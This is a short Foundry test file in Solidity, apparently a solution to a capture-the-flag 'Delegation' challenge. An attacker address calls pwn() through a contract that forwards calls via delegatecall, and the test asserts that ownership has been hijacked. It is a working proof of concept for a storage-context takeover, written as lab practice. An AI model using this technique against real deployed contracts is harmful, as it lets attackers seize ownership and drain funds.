// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegate, Delegation} from "../src/Delegete.sol";
import "forge-std/Test.sol";

contract DelegateTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        vm.deal(owner, 1 ether);
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
    }

    function testDelegate() public {
        vm.stopPrank();
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        Delegate(address(delegation)).pwn();
        assertEq(delegation.owner(), attacker);
    }
}
